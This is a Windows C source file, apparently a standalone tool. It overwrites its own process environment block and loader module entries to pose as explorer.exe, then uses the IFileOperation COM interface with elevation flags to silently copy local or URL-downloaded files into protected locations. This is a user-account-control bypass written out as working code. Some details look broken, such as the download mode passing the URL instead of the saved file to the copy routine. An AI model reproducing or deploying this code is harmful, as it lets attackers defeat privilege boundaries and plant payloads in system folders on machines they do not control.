// by jacky5112
#include "win_internal.h"
#include <stdio.h>
#include <ShlObj.h>
#include <Windows.h>
#include <urlmon.h>

#pragma comment (lib, "Urlmon.lib")

#define TARGET_EXE_FILE_PATH							L"C:\\Windows\\explorer.exe"
#define TARGET_EXE_FILE_NAME							L"explorer.exe"

HRESULT CopyItem(PCWSTR pszSrcItem, PCWSTR pszDest, PCWSTR pszNewName);

int wmain(int argc, wchar_t *argv[])
{
	if (argc == 5)
	{
		PEB32 *pPEB = 0;

		_asm push fs : [0x30];
		_asm pop[pPEB];

		/*
		// Check use
		fprintf(stdout, "%d\n", (SIZE_T)GetProcessHeap());
		_asm mov eax, dword ptr fs : [00000030h];
		_asm mov eax, dword ptr[eax + 18h];
		SIZE_T check = 0;
		_asm mov check, eax;
		fprintf(stdout, "%d\n", check);

		fprintf(stdout, "%S\n", ((PRTL_USER_PROCESS_PARAMETERS)(pPEB->ProcessParameters))->ImagePathName.Buffer);
		fprintf(stdout, "%S\n", ((PRTL_USER_PROCESS_PARAMETERS)(pPEB->ProcessParameters))->CommandLine.Buffer);
		fprintf(stdout, "%S\n", ((PRTL_USER_PROCESS_PARAMETERS)(pPEB->ProcessParameters))->DllPath.Buffer);
		fprintf(stdout, "%S\n", ((PRTL_USER_PROCESS_PARAMETERS)(pPEB->ProcessParameters))->WindowTitle.Buffer);
		fprintf(stdout, "%S\n", ((PRTL_USER_PROCESS_PARAMETERS)(pPEB->ProcessParameters))->DesktopName.Buffer);
		fprintf(stdout, "%S\n", ((PRTL_USER_PROCESS_PARAMETERS)(pPEB->ProcessParameters))->RuntimeData.Buffer);
		fprintf(stdout, "%S\n", ((PRTL_USER_PROCESS_PARAMETERS)(pPEB->ProcessParameters))->CurrentDirectoryPath.Buffer);
		
		RTL_DRIVE_LETTER_CURDIR check[0x20];
		memcpy(check, ((PRTL_USER_PROCESS_PARAMETERS)(pPEB->ProcessParameters))->DLCurrentDirectory, sizeof(check));
		*/

		((PRTL_USER_PROCESS_PARAMETERS)(pPEB->ProcessParameters))->ImagePathName.Buffer = TARGET_EXE_FILE_PATH;
		((PRTL_USER_PROCESS_PARAMETERS)(pPEB->ProcessParameters))->CommandLine.Buffer = TARGET_EXE_FILE_PATH;
		((PRTL_USER_PROCESS_PARAMETERS)(pPEB->ProcessParameters))->DllPath.Buffer = TARGET_EXE_FILE_PATH;
		PLDR_DATA_TABLE_ENTRY k = (PLDR_DATA_TABLE_ENTRY)(((PLDR_DATA_TABLE_ENTRY)(pPEB->Ldr))->InMemoryOrderModuleList.Blink);

		while (true)
		{
			if (k->FullDllName.Buffer)
			{
				if (wcsstr(k->FullDllName.Buffer, L".exe"))
				{
					k->FullDllName.Buffer = TARGET_EXE_FILE_PATH;
					k->BaseDllName.Buffer = TARGET_EXE_FILE_NAME;
					break;
				} // end if
			} // end if

			k = (PLDR_DATA_TABLE_ENTRY)((LIST_ENTRY*)k)->Flink;
		} // end while

		if (lstrcmpW(argv[1], L"-p") == 0)
		{
			CopyItem(argv[2], argv[3], argv[4]);
		} // end if
		else if (lstrcmpW(argv[1], L"-u") == 0)
		{
			WCHAR szPath[MAX_PATH];
			GetCurrentDirectoryW(sizeof(szPath), szPath);
			lstrcatW(szPath, L"\\");
			lstrcatW(szPath, argv[4]);
			HRESULT hr = URLDownloadToFileW(NULL, argv[2], szPath, 0, NULL);
			
			if (SUCCEEDED(hr))
			{
				CopyItem(argv[2], argv[3], argv[4]);
			} // end if
			else
			{
				fprintf(stdout, "[-] URLDownloadToFileW Error (%d).\n", GetLastError());
			} // end else
		} // end else if

		system("pause");
		return 0;
	} // end if

	fprintf(stderr, "<exe_name> -p <src file path> <dst file path> <dst file name>\n");
	fprintf(stderr, "<exe_name> -u <url> <dst file path> <dst file name>\n");

	system("pause");
	return -1;
} // end main

  // Ref. https://msdn.microsoft.com/zh-tw/library/windows/desktop/bb775761(v=vs.85).aspx
HRESULT CopyItem(PCWSTR pszSrcItem, PCWSTR pszDest, PCWSTR pszNewName)
{
	//
	// Initialize COM as STA.
	//
	HRESULT hr = CoInitializeEx(NULL, COINIT_APARTMENTTHREADED | COINIT_DISABLE_OLE1DDE);

	if (SUCCEEDED(hr))
	{
		IFileOperation *pfo;

		//
		// Create the IFileOperation interface 
		//
		hr = CoCreateInstance(CLSID_FileOperation,
			NULL,
			CLSCTX_ALL,
			IID_PPV_ARGS(&pfo));

		if (SUCCEEDED(hr))
		{
			//
			// Set the operation flags. Turn off all UI from being shown to the
			// user during the operation. This includes error, confirmation,
			// and progress dialogs.
			//
			hr = pfo->SetOperationFlags(FOF_NOCONFIRMMKDIR | FOF_NOERRORUI | FOF_RENAMEONCOLLISION | FOF_SILENT | FOFX_SHOWELEVATIONPROMPT | FOFX_REQUIREELEVATION);

			if (SUCCEEDED(hr))
			{
				//
				// Create an IShellItem from the supplied source path.
				//
				IShellItem *psiFrom = NULL;
				hr = SHCreateItemFromParsingName(pszSrcItem,
					NULL,
					IID_PPV_ARGS(&psiFrom));
				if (SUCCEEDED(hr))
				{
					IShellItem *psiTo = NULL;

					if (NULL != pszDest)
					{
						//
						// Create an IShellItem from the supplied 
						// destination path.
						//
						hr = SHCreateItemFromParsingName(pszDest,
							NULL,
							IID_PPV_ARGS(&psiTo));
					}

					if (SUCCEEDED(hr))
					{
						//
						// Add the operation
						//
						hr = pfo->CopyItem(psiFrom, psiTo, pszNewName, NULL);

						if (NULL != psiTo)
						{
							psiTo->Release();
						}
					}

					psiFrom->Release();
				}

				if (SUCCEEDED(hr))
				{
					//
					// Perform the operation to copy the file.
					//
					hr = pfo->PerformOperations();
				}
			}
			else
			{
				fprintf(stderr, "[-] SetOperationFlags Error (%d).\n", GetLastError());
			} // end else

			  //
			  // Release the IFileOperation interface.
			  //
			pfo->Release();
		}

		CoUninitialize();
	}
	else
	{
		fprintf(stderr, "[-] CoInitializeEx Error (%d).\n", GetLastError());
	} // end else

	fprintf(stdout, "[+] Copy file sucessfully.\n");

	return hr;
}